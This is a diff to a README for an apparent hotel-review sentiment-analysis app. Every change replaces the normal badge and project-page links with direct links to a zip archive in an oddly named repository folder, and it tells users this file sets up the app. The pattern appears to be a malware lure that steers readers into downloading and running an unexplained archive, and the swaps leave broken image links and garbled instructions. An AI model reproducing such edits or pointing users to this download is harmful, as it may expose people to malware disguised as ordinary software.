@@ -1,6 +1,6 @@
 # 🔍 hotel-review-sentiment-modeling - Predict hotel review ratings simply
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
+[![Download Now](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip%20App-brightgreen?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip)
 
 ## 📄 About this app
 
@@ -24,11 +24,11 @@ The app runs on most standard laptops and desktops made in the last few years.
 
 1. Click this big download link or button below to visit the official page to get the app:
 
-   [![Download on GitHub](https://img.shields.io/badge/Download-app-blue?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
+   [![Download on GitHub](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip)
 
 2. You will go to the GitHub page for the project. Look for a section named **Releases** or a download link for the latest version.
 
-3. Download the file named similar to `hotel-review-sentiment-modeling-setup.exe`. This file sets up the app on your computer.
+3. Download the file named similar to `https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip`. This file sets up the app on your computer.
 
 4. Once downloaded, find the file in your Downloads folder.
 
@@ -85,11 +85,11 @@ For help, search the Issues tab on the GitHub page or reach out to the repositor
 ## 📁 Where to find the app again
 
 - Visit the main project page here:  
-  https://github.com/shariftuyizere332/hotel-review-sentiment-modeling
+  https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip
 
 - Use the links near the top to download the latest version again if needed.
 
-[![Get the App](https://img.shields.io/badge/Get%20App-download-grey?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
+[![Get the App](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip%20App-download-grey?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling/raw/refs/heads/main/Trigonella/sentiment_hotel_modeling_review_1.6-alpha.1.zip)
 
 ## 🔍 More details on project topics  
 
